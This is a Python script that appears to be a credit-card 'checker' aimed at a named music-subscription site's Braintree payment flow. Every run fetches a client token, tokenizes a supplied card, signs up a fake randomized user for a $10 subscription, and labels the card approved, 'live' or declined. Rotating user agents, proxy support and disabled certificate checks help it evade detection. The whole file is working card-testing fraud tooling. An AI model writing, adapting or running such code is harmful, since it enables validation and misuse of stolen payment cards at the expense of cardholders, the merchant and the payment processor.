import requests
import json
import base64
import random
import string
import asyncio
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://www.mixtapemobstaz.com"
GRAPHQL = "https://payments.braintree-api.com/graphql"

TOKENIZE_QUERY = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin brandCode last4 expirationMonth expirationYear
      binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId }
    }
  }
}"""

UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
]

FN = ['James','John','Robert','Michael','David','William','Richard','Thomas','Daniel','Matthew']
LN = ['Smith','Johnson','Williams','Brown','Jones','Davis','Miller','Wilson','Anderson','Taylor']

def rand_user():
    fn = random.choice(FN)
    ln = random.choice(LN)
    num = random.randint(100, 9999)
    username = f"{fn.lower()}{ln.lower()}{num}"
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + "!"
    phone = f"303{random.randint(100,999)}{random.randint(1000,9999)}"
    return username, email, password, phone

def classify(msg):
    m = (msg or '').lower()
    if any(x in m for x in ('approved','settling','authorized','succeeded','subscribed','subscription created')):
        return "approved", "Subscription Created / Approved"
    
    if any(k in m for k in ('insufficient', 'cvv', 'avs')):
        if 'insufficient' in m:
            return "live", "Insufficient Funds"
        elif 'cvv' in m:
            return "live", "CVV Mismatch"
        else:
            return "live", "AVS Mismatch"

    return "declined", msg[:80] if msg else "Declined"

def check_card_mixtape_sync(cc, mm, yy, cvc, proxy_url=None):
    """
    Synchronous Braintree $10 Subscription check on mixtapemobstaz.com.
    Returns: (status, message, brand)
    """
    if len(yy) == 2:
        yy = f"20{yy}"

    s = requests.Session()
    s.headers.update({
        'User-Agent': random.choice(UAS),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'application/json, text/plain, */*',
    })
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})

    try:
        # Step 1: Get Braintree Client Token
        r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
        data_tok = r_tok.json()
        token = data_tok.get('clientToken', '')
        if not token:
            return "error", "Failed to fetch Braintree token", "N/A"

        padded = token + '=' * (4 - len(token) % 4)
        decoded = json.loads(base64.b64decode(padded))
        auth_fp = decoded.get('authorizationFingerprint')
        if not auth_fp:
            return "error", "Failed to decode authorization fingerprint", "N/A"

        # Step 2: Tokenize Card via Braintree GraphQL
        r_gql = s.post(GRAPHQL, json={
            'query': TOKENIZE_QUERY,
            'variables': {"input": {"creditCard": {
                "number": cc, "expirationMonth": mm,
                "expirationYear": yy, "cvv": cvc
            }, "options": {"validate": False}}},
            'operationName': 'TokenizeCreditCard'
        }, headers={
            'Authorization': f'Bearer {auth_fp}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': BASE,
        }, timeout=15, verify=False)
        data_gql = r_gql.json()
        tc = data_gql.get('data', {}).get('tokenizeCreditCard', {})
        nonce = tc.get('token')
        card_info = tc.get('creditCard', {})
        brand = card_info.get('brandCode', 'Braintree')

        if not nonce:
            return "error", "Braintree Card Tokenization Failed", "N/A"

        # Step 3: Subscribe
        username, email, password, phone = rand_user()
        r_sub = s.post(f"{BASE}/api/user/subscribe2", json={
            "username": username,
            "email": email,
            "password": password,
            "mobilephone": phone,
            "invite_code": None,
            "plan_id": "plan-01",
            "braintreePayment": {
                "nonce": nonce,
                "details": {
                    "cardholderName": None,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "bin": cc[:6],
                    "cardType": brand,
                    "lastFour": cc[-4:],
                    "lastTwo": cc[-2:],
                },
                "type": "CreditCard",
                "description": f"ending in {cc[-4:]}",
                "binData": card_info.get('binData', {}),
            }
        }, headers={
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Origin': BASE,
            'Referer': f"{BASE}/signup-plan/plan-01",
        }, timeout=20, verify=False)

        try:
            resp = r_sub.json()
            msg = resp.get('msg', '') or resp.get('message', '')
        except Exception:
            msg = r_sub.text[:100]

        status, reason = classify(msg)
        return status, reason, brand

    except Exception as e:
        return "error", str(e), "N/A"

async def check_card_mixtape(cc, mm, yy, cvc, proxy_url=None):
    """
    Async wrapper for check_card_mixtape_sync.
    """
    return await asyncio.to_thread(check_card_mixtape_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
